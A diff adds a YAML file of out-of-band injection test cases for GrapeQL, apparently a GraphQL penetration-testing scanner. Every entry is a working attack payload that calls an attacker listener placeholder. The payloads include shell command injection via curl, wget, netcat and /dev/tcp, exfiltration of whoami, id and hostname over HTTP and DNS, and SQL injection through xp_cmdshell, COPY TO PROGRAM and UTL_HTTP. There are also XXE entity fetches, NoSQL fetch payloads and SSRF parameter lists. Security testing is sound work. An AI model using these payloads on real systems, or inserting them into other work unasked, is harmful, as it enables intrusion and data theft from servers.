@@ -1,0 +1,243 @@
+# ================================================================
+# GrapeQL OOB Injection Test Cases
+# Drop into: test_cases/injection/oob.yaml
+# ================================================================
+#
+# These payloads trigger the target server to make an outbound
+# connection to the attacker-controlled listener.  Detection is
+# NOT via response content -- it's via the TCP connection itself.
+#
+# Placeholder: CALLBACK  -> replaced at runtime with http://ip:port
+#              CALLBACK_HOST -> replaced with listener IP only
+#              CALLBACK_PORT -> replaced with listener port only
+#
+# All test cases MUST have  oob: true  so the loader routes them
+# to the OOB testing path instead of indicator-based detection.
+# ================================================================
+
+test_cases:
+
+  # ── Command Injection OOB ──────────────────────────────────────────
+
+  - name: oob_curl_http
+    payload: "; curl CALLBACK/cmd-curl"
+    oob: true
+    description: "HTTP callback via curl"
+
+  - name: oob_curl_data_exfil
+    payload: "; curl CALLBACK/$(whoami)"
+    oob: true
+    description: "Data exfiltration of whoami via curl path"
+
+  - name: oob_curl_post_id
+    payload: "; curl -X POST -d $(id) CALLBACK/exfil"
+    oob: true
+    description: "POST id output to callback"
+
+  - name: oob_wget
+    payload: "; wget -q -O /dev/null CALLBACK/cmd-wget"
+    oob: true
+    description: "HTTP callback via wget"
+
+  - name: oob_wget_exfil
+    payload: "; wget -q -O /dev/null CALLBACK/$(hostname)"
+    oob: true
+    description: "Hostname exfiltration via wget path"
+
+  - name: oob_python_urllib
+    payload: "'; __import__('urllib.request').request.urlopen('CALLBACK/py'); '"
+    oob: true
+    description: "Python urllib OOB callback"
+
+  - name: oob_python_requests
+    payload: "'; __import__('requests').get('CALLBACK/py-req'); '"
+    oob: true
+    description: "Python requests OOB callback"
+
+  - name: oob_perl
+    payload: "; perl -e 'use LWP::Simple; get(\"CALLBACK/perl\");'"
+    oob: true
+    description: "Perl LWP OOB callback"
+
+  - name: oob_ruby
+    payload: "; ruby -e \"require 'net/http'; Net::HTTP.get(URI('CALLBACK/ruby'))\""
+    oob: true
+    description: "Ruby net/http OOB callback"
+
+  - name: oob_bash_devtcp
+    payload: "; bash -c 'echo oob > /dev/tcp/CALLBACK_HOST/CALLBACK_PORT'"
+    oob: true
+    description: "Bash /dev/tcp callback (no curl/wget needed)"
+
+  - name: oob_nc
+    payload: "; echo oob | nc -w 2 CALLBACK_HOST CALLBACK_PORT"
+    oob: true
+    description: "Netcat callback"
+
+  - name: oob_ping
+    payload: "; ping -c 1 CALLBACK_HOST"
+    oob: true
+    description: "ICMP callback via ping (TCP listener won't catch this but logs the attempt)"
+
+  # ── Backtick / $() variants ───────────────────────────────────────
+
+  - name: oob_subshell_curl
+    payload: "$(curl CALLBACK/subshell)"
+    oob: true
+    description: "Command substitution with curl"
+
+  - name: oob_backtick_curl
+    payload: "`curl CALLBACK/backtick`"
+    oob: true
+    description: "Backtick command substitution with curl"
+
+  - name: oob_subshell_wget
+    payload: "$(wget -q -O /dev/null CALLBACK/sub-wget)"
+    oob: true
+    description: "Command substitution with wget"
+
+  - name: oob_pipe_curl
+    payload: "| curl CALLBACK/pipe"
+    oob: true
+    description: "Pipe into curl"
+
+  - name: oob_and_curl
+    payload: "&& curl CALLBACK/and-curl"
+    oob: true
+    description: "AND-chained curl"
+
+  - name: oob_or_curl
+    payload: "|| curl CALLBACK/or-curl"
+    oob: true
+    description: "OR-chained curl (fires on command failure)"
+
+  # ── SSRF-style OOB (injected into URL-type arguments) ─────────────
+
+  - name: oob_ssrf_url
+    payload: "CALLBACK/ssrf-url"
+    oob: true
+    target_args:
+      - url
+      - uri
+      - href
+      - link
+      - webhook
+      - callback
+      - endpoint
+      - feed
+      - src
+      - source
+    description: "Direct URL injection into URL-type fields"
+
+  - name: oob_ssrf_image
+    payload: "CALLBACK/ssrf-image.png"
+    oob: true
+    target_args:
+      - image
+      - avatar
+      - icon
+      - photo
+      - picture
+      - thumbnail
+      - logo
+      - banner
+    description: "Image URL injection for SSRF"
+
+  - name: oob_ssrf_import
+    payload: "CALLBACK/ssrf-import"
+    oob: true
+    target_args:
+      - import
+      - importUrl
+      - import_url
+      - fetch
+      - fetchUrl
+      - fetch_url
+      - load
+      - loadUrl
+      - load_url
+    description: "Import/fetch URL injection for SSRF"
+
+  - name: oob_ssrf_redirect
+    payload: "CALLBACK/ssrf-redirect"
+    oob: true
+    target_args:
+      - redirect
+      - returnUrl
+      - return_url
+      - next
+      - goto
+      - continue
+      - target
+    description: "Redirect parameter SSRF"
+
+  # ── SQL OOB ───────────────────────────────────────────────────────
+
+  - name: oob_sqli_mysql_load
+    payload: "' UNION SELECT LOAD_FILE('\\\\\\\\CALLBACK_HOST\\\\share') -- "
+    oob: true
+    description: "MySQL LOAD_FILE UNC path (Windows DNS/SMB exfil)"
+
+  - name: oob_sqli_postgres_copy
+    payload: "'; COPY (SELECT '') TO PROGRAM 'curl CALLBACK/pg-copy'; --"
+    oob: true
+    description: "PostgreSQL COPY TO PROGRAM OOB"
+
+  - name: oob_sqli_mssql_xpcmdshell
+    payload: "'; EXEC xp_cmdshell 'curl CALLBACK/mssql'; --"
+    oob: true
+    description: "MSSQL xp_cmdshell OOB via curl"
+
+  - name: oob_sqli_mssql_openrowset
+    payload: "'; SELECT * FROM OPENROWSET('SQLNCLI','Server=CALLBACK_HOST;','SELECT 1'); --"
+    oob: true
+    description: "MSSQL OPENROWSET outbound connection"
+
+  - name: oob_sqli_oracle_utl_http
+    payload: "' UNION SELECT UTL_HTTP.REQUEST('CALLBACK/oracle') FROM DUAL -- "
+    oob: true
+    description: "Oracle UTL_HTTP OOB request"
+
+  # ── XXE OOB ───────────────────────────────────────────────────────
+
+  - name: oob_xxe_entity
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"CALLBACK/xxe\">]><foo>&xxe;</foo>"
+    oob: true
+    description: "XXE external entity fetch"
+
+  - name: oob_xxe_parameter_entity
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"CALLBACK/xxe-param\"> %xxe;]><foo>test</foo>"
+    oob: true
+    description: "XXE parameter entity fetch"
+
+  # ── NoSQL OOB ─────────────────────────────────────────────────────
+
+  - name: oob_nosql_where_fetch
+    payload: "'; var x = new java.net.URL('CALLBACK/mongo'); x.openConnection().getInputStream(); var y='"
+    oob: true
+    description: "MongoDB $where Java interop OOB"
+
+  - name: oob_nosql_js_fetch
+    payload: "'; fetch('CALLBACK/nosql-fetch'); var y='"
+    oob: true
+    description: "NoSQL JavaScript fetch() OOB"
+
+  # ── DNS exfiltration (target resolves attacker domain) ────────────
+  #    Note: These require CALLBACK_HOST to be a domain you control
+  #    with DNS logging.  Against a raw IP listener they act as basic
+  #    command injection confirmation instead.
+
+  - name: oob_dns_dig
+    payload: "; dig $(whoami).CALLBACK_HOST"
+    oob: true
+    description: "DNS exfiltration of whoami via dig"
+
+  - name: oob_dns_nslookup
+    payload: "; nslookup $(hostname).CALLBACK_HOST"
+    oob: true
+    description: "DNS exfiltration of hostname via nslookup"
+
+  - name: oob_dns_host
+    payload: "; host $(id | base64 | head -c 60).CALLBACK_HOST"
+    oob: true
+    description: "DNS exfiltration of id output via host command"
